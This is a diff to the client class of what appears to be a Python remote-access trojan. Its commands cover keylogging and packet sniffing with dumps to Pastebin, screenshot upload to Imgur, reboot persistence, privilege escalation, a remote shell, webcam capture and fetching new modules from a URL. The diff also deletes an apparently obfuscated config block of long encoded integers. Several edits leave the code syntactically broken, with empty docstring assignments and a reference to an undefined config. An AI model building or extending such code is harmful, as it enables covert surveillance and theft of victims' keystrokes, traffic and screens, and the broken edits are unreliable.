@@ -100,11 +100,11 @@ class Client(object):
 
     # ------------------- private functions -------------------------
 
-    def _help(self): return getattr(self, target).func_doc if target in self._commands else "'{}' not found".format(target)
+    def _help(self, *arg): return self._show({cmd: self._commands[cmd].func_doc for cmd in self._commands}) if not arg else self._help_command(arg[0])
+
+    def _help_command(self, cmd): return getattr(self, cmd).func_doc if bool(len(cmd) and cmd in self._commands) else "'{}' not found".format(cmd)
     
     def _help_modules(self): return self._show({mod: self._modules[mod].status for mod in self._modules})
-
-    def _help_commands(self): return self._show({cmd: self._commands[cmd].func_doc for cmd in self._commands})
 
     def _wget(self, target): return urlretrieve(target)[0]
     
@@ -1009,13 +1009,13 @@ class Client(object):
     def results(self): return self._show(self._result)
 
     @_command
-    def help(self, target): return self._help(target)
+    def help(self, *args): return self._help(args) if len(args) else self._help()
 
     @_command
     def info(self): return self._show(self._info)
 
     @_command
-    def commands(self): return self._help_commands 
+    def commands(self): """usage:\t\tcommands\ndescription:\tlist commands with usage help""" return self._help_commands 
 
     @_command
     def modules(self): return self._help_modules 
@@ -1024,16 +1024,16 @@ class Client(object):
     def webcam(self): return self._webcam()
     
     @_module
-    def keylogger(self): return self._keylogger()
+    def keylogger(self): """usage:\t\tkeylogger\ndescription:\tlog client keystrokes remotely + dump to Pastebin""" return self._keylogger()
 
     @_module
-    def screenshot(self): return self._screenshot()
+    def screenshot(self): """usage:\t\tscreenshot\ndescription:\ttake screenshot + upload to Imgur""" return self._screenshot()
 
     @_module
-    def persistence(self): return self._persistence()
+    def persistence(self): """usage:\t\tpersistence\ndescription:\testablish persistence to relaunch on reboot""" return self._persistence()
     
     @_module
-    def packetsniffer(self): return self._packetsniffer()
+    def packetsniffer(self): """usage:\t\tpacketsniffer\ndescription:\tcapture client network traffic + dump to Pastebin""" return self._packetsniffer()
 
     ls.func_doc                = """usage:\t\tls <path>\ndescription:\tlist directory contents"""
     cd.func_doc                = """usage:\t\tcd <path>\ndescription:\tchange directory"""
@@ -1041,46 +1041,33 @@ class Client(object):
     new.func_doc               = """usage:\t\tnew <url>\ndescription:\tdownload new module from url"""
     run.func_doc               = """usage:\t\trun\ndescription:\trun enabled client modules"""
     pwd.func_doc               = """usage:\t\tpwd\ndescription:\tpresent working directory"""
+    help.func_doc              = """usage:\t\thelp [option]\ndescription:\tshow command usage information"""
     jobs.func_doc              = """usage:\t\tjobs\ndescription:\tlist currently active jobs"""
     kill.func_doc              = """usage:\t\tkill\ndescription:\tkill client"""
     show.func_doc              = """usage:\t\tshow <option>\ndescription:\tshow client attributes"""
+    wget.func_doc              = """usage:\t\twget <url>\ndescription:\tdownload file from url"""
     admin.func_doc             = """usage:\t\tadmin\ndescription:\tattempt to escalate privileges"""
     shell.func_doc             = """usage:\t\tshell\ndescription:\trun client shell """
     start.func_doc             = """usage:\t\tstart\ndescription:\tstart client"""
-    wget.func_doc              = """usage:\t\twget <url>\ndescription:\tdownload file from url"""
     webcam.func_doc            = """usage:\t\twebcam\ndescription:\tremote image/video capture from client webcam"""
     enable.func_doc            = """usage:\t\tenable <module>\ndescription:\tenable module"""
     standby.func_doc           = """usage:\t\tstandby\ndescription:\trevert to standby mode"""
     options.func_doc           = """usage:\t\toptions\ndescription:\tdisplay module options"""
     disable.func_doc           = """usage:\t\tdisable <module>\ndescription:\tdisable module"""
     results.func_doc           = """usage:\t\tresults\ndescription:\tshow all modules output"""
-    commands.func_doc          = """usage:\t\tcommands\ndescription:\tlist commands with descriptions"""
-    keylogger.func_doc         = """usage:\t\tkeylogger\ndescription:\tlog client keystrokes remotely + dump to Pastebin"""
-    screenshot.func_doc        = """usage:\t\tscreenshot\ndescription:\ttake screenshot + upload to Imgur"""
-    persistence.func_doc       = """usage:\t\tpersistence\ndescription:\testablish persistence to relaunch on reboot"""
-    packetsniffer.func_doc     = """usage:\t\tpacketsniffer\ndescription:\tcapture client network traffic + dump to Pastebin"""
+    commands.func_doc          = 
+    keylogger.func_doc         = 
+    screenshot.func_doc        = 
+    persistence.func_doc       = 
+    packetsniffer.func_doc     = 
 
 # -----------------   main   --------------------------
 
 def main(*args, **kwargs):
-    config = {
-            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
-            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
-            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
-            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
-            "__e__": "423224063517525567299427660991207813087967857812230603629111",
-            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
-            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
-            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
-            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
-            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
-            "__v__": "1",
-	    "__w__": "12095051301478169748777225282050429328988589300942044190524179185395659761404742",
-            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
-            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
-    }
-    client = Client(**config)
-    return client
+    client = Client(**kwargs)
+    return client.start()
 
+if __name__ == '__main__':
+    main(**config)
 
 
